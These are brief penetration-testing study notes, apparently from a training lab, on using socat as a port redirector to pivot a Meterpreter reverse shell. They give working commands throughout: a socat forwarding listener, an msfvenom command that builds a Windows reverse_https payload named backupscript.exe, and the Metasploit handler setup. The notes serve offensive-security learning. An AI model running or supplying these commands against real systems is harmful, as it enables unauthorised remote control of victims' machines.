Socat is a bidrectional relay tool
- Can create pip sockets between 2 independent network channels
- No need for SSH tunneling
- Acts as a redirector, listening on on ehost port and forwaring that data to another IP address and port
	- Similar to SSH -L and Meterpreter portfwd

# Socat redirection with Reverse shell
- Start SOCAT listener on the Ubuntu machine
	- `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
	- Litens on port 8080 and forwards traffic to port 80 on attack host (10.10.14.18)
- The subsequent steps are the same as before
	- Create the windows payload to make Windows machine connect to Ubuntu on port 8080
		- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`
	- Start multi handler listener on local machine
		- `msf6 > use exploit/multi/handler`
		- `set payload windows/x64/meterpreter/reverse_https`
		- `set lhost 0.0.0.0`
		- `set lport 80`
		- `run`
